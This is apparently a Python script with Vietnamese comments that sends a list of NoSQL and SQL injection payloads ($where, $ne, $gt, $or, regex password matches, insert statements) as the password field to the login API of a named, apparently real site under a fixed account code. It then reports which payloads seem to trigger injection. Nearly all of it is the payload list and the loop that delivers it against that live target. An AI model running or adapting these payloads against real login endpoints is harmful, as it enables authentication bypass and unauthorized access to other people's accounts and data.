import requests

# Danh sách các payload có thể gây ra lỗi SQL Injection hoặc NoSQL Injection
payloads = [
    "true, $where: '1 == 1'",
    "1, $where: '1 == 1'",
    "{ $ne: 1 }",
    "', $or: [ {}, { 'a':'a' } ], $comment:'successful MongoDB injection'",
    "db.injection.insert({success:1});",
    "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { emit(1,1) }",
    "|| 1==1",
    "' && this.password.match(/.*/)//+%00",
    "' && this.passwordzz.match(/.*/)//+%00",
    "%20&& this.password.match(/.*/)//+%00",
    "%20&& this.passwordzz.match(/.*/)//+%00",
    "{$gt: ''}",
    "[$ne]=1"
]

# URL của trang web bạn muốn kiểm tra
url = "https://api.thuvienso.minhviet.group/api/login"
# Thay đổi 'username' và 'password' tùy theo cấu trúc tham số của trang web bạn đang kiểm tra
data = {
    "code": "0375871003",
    "password": ""
}
# Tiến hành kiểm tra
for payload in payloads:
    data["password"] = payload
    response = requests.post(url, data=data)
    # Đây chỉ là một cách rất cơ bản để phát hiện SQL Injection và NoSQL Injection
    # Dựa trên việc phân tích câu trả lời từ server có chứa từ khóa nhất định
    if response.status_code == 200:
        if "error" in response.text.lower() or "sql" in response.text.lower() or "mongodb" in response.text.lower():
            print(f"Payload {payload} có thể dẫn đến Injection!")
        else:
            print(f"Payload {payload} không phát hiện lỗi.")
    else:
        print(f"Payload {payload} không thể dẫn đến Injection!")

